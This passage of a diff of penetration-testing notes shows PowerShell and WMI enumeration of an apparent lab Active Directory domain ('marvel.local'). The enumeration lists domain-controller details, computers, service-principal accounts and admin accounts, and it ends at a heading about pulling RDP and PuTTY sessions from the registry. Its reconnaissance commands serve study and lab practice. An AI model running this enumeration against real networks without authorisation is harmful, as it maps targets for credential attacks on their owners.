-                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
-DS_maxPwdAge                                   : -36288000000000
-DS_memberOf                                    :
-DS_minPwdAge                                   : -864000000000
-DS_minPwdLength                                : 7
-DS_modifiedCount                               : 1
-DS_modifiedCountAtLastProm                     : 0
-DS_modifyTimeStamp                             :
-DS_mS_DS_ConsistencyChildCount                 :
-DS_mS_DS_ConsistencyGuid                       :
-DS_ms_DS_MachineAccountQuota                   : 10
-DS_msCOM_PartitionSetLink                      :
-DS_msCOM_UserLink                              :
-DS_msDFSR_ComputerReferenceBL                  :
-DS_msDFSR_MemberReferenceBL                    :
-DS_msDS_AllowedDNSSuffixes                     :
-DS_msDS_AllUsersTrustQuota                     : 1000
-DS_msDS_Approx_Immed_Subordinates              :
-DS_msDS_AuthenticatedToAccountlist             :
-DS_msDS_Behavior_Version                       : 7
-DS_msDS_ClaimSharesPossibleValuesWithBL        :
-DS_msDS_CloudAnchor                            :
-DS_msDS_EnabledFeature                         :
-DS_msDS_EnabledFeatureBL                       :
-DS_msDS_ExpirePasswordsOnSmartCardOnlyAccounts : True
-DS_msDS_HostServiceAccountBL                   :
-DS_msDS_IsDomainFor                            : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
-                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
-DS_msDS_IsFullReplicaFor                       :
-DS_msDS_IsPartialReplicaFor                    :
-DS_msDS_IsPrimaryComputerFor                   :
-DS_msDS_KrbTgtLinkBl                           :
-DS_msDS_LastKnownRDN                           :
-DS_msDS_LocalEffectiveDeletionTime             :
-DS_msDS_LocalEffectiveRecycleTime              :
-DS_msDS_LogonTimeSyncInterval                  :
-DS_msDs_masteredBy                             : {CN=NTDS Settings,CN=HYDRA,CN=Servers,CN=Default-First-Site-N
-                                                 ame,CN=Sites,CN=Configuration,DC=marvel,DC=local}
-DS_msds_memberOfTransitive                     :
-DS_msDS_MembersForAzRoleBL                     :
-DS_msDS_MembersOfResourcePropertyListBL        :
-DS_msds_memberTransitive                       :
-DS_msDS_NC_RO_Replica_Locations_BL             :
-DS_msDS_NCReplCursors                          :
-DS_msDS_NCReplInboundNeighbors                 :
-DS_msDS_NCReplOutboundNeighbors                :
-DS_msDS_NcType                                 : 0
-DS_msDS_NonMembersBL                           :
-DS_msDS_ObjectReferenceBL                      :
-DS_msDS_ObjectSoa                              :
-DS_msDS_OIDToGroupLinkBl                       :
-DS_msDS_OperationsForAzRoleBL                  :
-DS_msDS_OperationsForAzTaskBL                  :
-DS_msDS_parentdistname                         :
-DS_msDS_PerUserTrustQuota                      : 1
-DS_msDS_PerUserTrustTombstonesQuota            : 10
-DS_msDS_PrincipalName                          :
-DS_msDS_PSOApplied                             :
-DS_msDS_ReplAttributeMetaData                  :
-DS_msDS_ReplValueMetaData                      :
-DS_msDS_ReplValueMetaDataExt                   :
-DS_msDS_RevealedDSAs                           :
-DS_msDS_RevealedListBL                         :
-DS_msDS_SourceAnchor                           :
-DS_msDS_TasksForAzRoleBL                       :
-DS_msDS_TasksForAzTaskBL                       :
-DS_msDS_TDOEgressBL                            :
-DS_msDS_TDOIngressBL                           :
-DS_msDS_USNLastSyncSuccess                     :
-DS_msDS_ValueTypeReferenceBL                   :
-DS_msSFU30PosixMemberOf                        :
-DS_name                                        : marvel
-DS_nETBIOSName                                 :
-DS_netbootSCPBL                                :
-DS_nextRid                                     : 1000
-DS_nonSecurityMemberBL                         :
-DS_nTMixedDomain                               : 0
-DS_nTSecurityDescriptor                        : System.Management.ManagementBaseObject
-DS_objectCategory                              : CN=Domain-DNS,CN=Schema,CN=Configuration,DC=marvel,DC=local
-DS_objectClass                                 : {top, domain, domainDNS}
-DS_objectGUID                                  : System.Management.ManagementBaseObject
-DS_objectSid                                   : System.Management.ManagementBaseObject
-DS_objectVersion                               :
-DS_oEMInformation                              :
-DS_otherWellKnownObjects                       : {System.Management.ManagementBaseObject,
-                                                 System.Management.ManagementBaseObject}
-DS_ownerBL                                     :
-DS_partialAttributeDeletionList                :
-DS_partialAttributeSet                         :
-DS_pekKeyChangeInterval                        :
-DS_pekList                                     :
-DS_possibleInferiors                           :
-DS_privateKey                                  :
-DS_proxiedObjectName                           :
-DS_proxyAddresses                              :
-DS_pwdHistoryLength                            : 24
-DS_pwdProperties                               : 1
-DS_queryPolicyBL                               :
-DS_replicaSource                               :
-DS_replPropertyMetaData                        :
-DS_replUpToDateVector                          :
-DS_repsFrom                                    :
-DS_repsTo                                      :
-DS_revision                                    :
-DS_rIDManagerReference                         : CN=RID Manager$,CN=System,DC=marvel,DC=local
-DS_sDRightsEffective                           :
-DS_serverReferenceBL                           :
-DS_serverRole                                  :
-DS_serverState                                 : 1
-DS_showInAdvancedViewOnly                      :
-DS_siteObjectBL                                :
-DS_structuralObjectClass                       :
-DS_subRefs                                     : {DC=ForestDnsZones,DC=marvel,DC=local,
-                                                 DC=DomainDnsZones,DC=marvel,DC=local,
-                                                 CN=Configuration,DC=marvel,DC=local}
-DS_subSchemaSubEntry                           :
-DS_systemFlags                                 : -1946157056
-DS_treeName                                    :
-DS_uASCompat                                   : 1
-DS_url                                         :
-DS_uSNChanged                                  : 69650
-DS_uSNCreated                                  : 4099
-DS_uSNDSALastObjRemoved                        :
-DS_USNIntersite                                :
-DS_uSNLastObjRem                               :
-DS_uSNSource                                   :
-DS_wbemPath                                    :
-DS_wellKnownObjects                            : {System.Management.ManagementBaseObject,
-                                                 System.Management.ManagementBaseObject,
-                                                 System.Management.ManagementBaseObject,
-                                                 System.Management.ManagementBaseObject...}
-DS_whenChanged                                 : 20200114023947.000000-480
-DS_whenCreated                                 : 20191230035758.000000-480
-DS_wWWHomePage                                 :
-PSComputerName                                 : SPIDERMAN
-```
-
-DC for Current box:
-
-```
-PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480} |select -ExpandProperty ds_cn                                                                                                                        
-HYDRA
-
-```
-
-
-Computers in current Domain
-
-```
-PS C:\Users\pparker> Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  ds_cn
-
-ds_cn
------
-HYDRA
-PUNISHER
-DESKTOP-DGQM4HL
-SPODERMAN
-SPIDERMAN
-```
-Current DC info
-```
-PS C:\Users\pparker> (Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | Where-Object {$_.ds_userAccountControl -eq 532480}).Properties | Foreach-Object {If($_.value -AND $_.name -notmatch "__"){@{ $($_.name) = $($_.value)}}}
-
-Name                           Value
-----                           -----
-ADSIPath                       LDAP://CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
-DS_accountExpires              9223372036854775807
-DS_cn                          HYDRA
-DS_distinguishedName           CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
-DS_dNSHostName                 HYDRA.marvel.local
-DS_dSCorePropagationData       {20191230035857.000000-480, 16010101000001.000000-000}
-DS_instanceType                4
-DS_isCriticalSystemObject      True
-DS_lastLogon                   132234720331123278
-DS_lastLogonTimestamp          132231758269911528
-DS_logonCount                  96
-DS_msDFSR_ComputerReferenceBL  CN=HYDRA,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=Syste...
-DS_msDS_GenerationId           System.Management.ManagementBaseObject
-DS_msDS_SupportedEncryption... 28
-DS_name                        HYDRA
-DS_nTSecurityDescriptor        System.Management.ManagementBaseObject
-DS_objectCategory              CN=Computer,CN=Schema,CN=Configuration,DC=marvel,DC=local
-DS_objectClass                 {top, person, organizationalPerson, user...}
-DS_objectGUID                  System.Management.ManagementBaseObject
-DS_objectSid                   System.Management.ManagementBaseObject
-DS_operatingSystem             Windows Server 2016 Standard Evaluation
-DS_operatingSystemVersion      10.0 (14393)
-DS_primaryGroupID              516
-DS_pwdLastSet                  132221807628573590
-DS_rIDSetReferences            CN=RID Set,CN=HYDRA,OU=Domain Controllers,DC=marvel,DC=local
-DS_sAMAccountName              HYDRA$
-DS_sAMAccountType              805306369
-DS_serverReferenceBL           CN=HYDRA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=...
-DS_servicePrincipalName        {TERMSRV/HYDRA, TERMSRV/HYDRA.marvel.local, Dfsr-12F9A27C-BF97-4787-9364-D31...
-DS_userAccountControl          532480
-DS_uSNChanged                  69670
-DS_uSNCreated                  12293
-DS_whenChanged                 20200114030056.000000-480
-DS_whenCreated                 20191230035857.000000-480
-```
-
-
-# Useful Powershell
-
-Looking for SPN's (works only with activedirectory module)
-```
-PS C:\Users\Administrator>  get-aduser -filter {ServicePrincipalName -like "*"} -Properties PasswordLastSet,LastLogonDat
-e,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
-
-
-DistinguishedName          : CN=krbtgt,CN=Users,DC=marvel,DC=local
-Enabled                    : False
-GivenName                  :
-LastLogonDate              :
-Name                       : krbtgt
-ObjectClass                : user
-ObjectGUID                 : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
-PasswordLastSet            : 12/30/2019 3:58:57 AM
-SamAccountName             : krbtgt
-ServicePrincipalName       : {kadmin/changepw}
-SID                        : S-1-5-21-1806573636-3987246654-2051155295-502
-Surname                    :
-TrustedForDelegation       : False
-TrustedToAuthForDelegation : False
-UserPrincipalName          :
-
-DistinguishedName          : CN=spn1,CN=Users,DC=marvel,DC=local
-Enabled                    : True
-GivenName                  :
-LastLogonDate              : 1/7/2020 2:06:56 AM
-Name                       : spn1
-ObjectClass                : user
-ObjectGUID                 : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
-PasswordLastSet            : 1/7/2020 12:31:28 AM
-SamAccountName             : spn1
-ServicePrincipalName       : {http/hydra.marvel.local:80}
-SID                        : S-1-5-21-1806573636-3987246654-2051155295-1109
-Surname                    :
-TrustedForDelegation       : False
-TrustedToAuthForDelegation : False
-UserPrincipalName          :
-```
-
-Looking for Admin accounts (works only with activedirectory module)
-
-```
-PS C:\Users\Administrator> get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf
-
-
-AdminCount        : 1
-DistinguishedName : CN=Administrator,CN=Users,DC=marvel,DC=local
-Enabled           : True
-GivenName         :
-LastLogonDate     : 12/30/2019 12:29:41 PM
-MemberOf          : {CN=Group Policy Creator Owners,CN=Users,DC=marvel,DC=local, CN=Domain Admins,CN=Users,DC=marvel,DC=local, CN=Enterprise Admins,CN=Users,DC=marvel,DC=local, CN=Schema Admins,CN=Users,DC=marvel,DC=local...}
-Name              : Administrator
-ObjectClass       : user
-ObjectGUID        : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
-PasswordLastSet   : 12/30/2019 1:29:57 AM
-SamAccountName    : Administrator
-SID               : S-1-5-21-1806573636-3987246654-2051155295-500
-Surname           :
-UserPrincipalName :
-
-AdminCount           : 1
-DistinguishedName    : CN=krbtgt,CN=Users,DC=marvel,DC=local
-Enabled              : False
-GivenName            :
-LastLogonDate        :
-MemberOf             : {CN=Denied RODC Password Replication Group,CN=Users,DC=marvel,DC=local}
-Name                 : krbtgt
-ObjectClass          : user
-ObjectGUID           : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
-PasswordLastSet      : 12/30/2019 3:58:57 AM
-SamAccountName       : krbtgt
-ServicePrincipalName : {kadmin/changepw}
-SID                  : S-1-5-21-1806573636-3987246654-2051155295-502
-Surname              :
-UserPrincipalName    :
-
-AdminCount           : 1
-DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local
-Enabled              : True
-GivenName            :
-LastLogonDate        : 1/7/2020 2:06:56 AM
-MemberOf             : {CN=Domain Admins,CN=Users,DC=marvel,DC=local}
-Name                 : spn1
-ObjectClass          : user
-ObjectGUID           : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
-PasswordLastSet      : 1/7/2020 12:31:28 AM
-SamAccountName       : spn1
-ServicePrincipalName : {http/hydra.marvel.local:80}
-SID                  : S-1-5-21-1806573636-3987246654-2051155295-1109
-Surname              :
-UserPrincipalName    :
 ```
 
 Extract RDP, Putty sessions form Registry:
